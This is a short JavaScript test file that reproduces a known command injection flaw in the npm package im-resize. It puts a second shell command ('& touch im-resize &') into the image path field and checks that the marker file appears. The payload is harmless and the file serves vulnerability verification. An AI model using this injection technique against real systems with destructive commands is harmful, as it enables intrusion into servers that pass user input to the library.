//https://snyk.io/vuln/SNYK-JS-IMRESIZE-544183
test("Command Injection in im-resize", () => 
{
	const root = require('im-resize')
	const fs = require('fs');
	const path = './im-resize';
	const sleep = require('sleep');
	
	//checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
    
	let image = {
		"path": "& touch im-resize &"
		};
	let output ={
		"versions":[]
		};
	root(image,output,function(){});
	sleep.sleep(5);
	//checking that its created by after exploit.
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);

	fs.unlink(path, function(err) {});//deleting the file after creation
});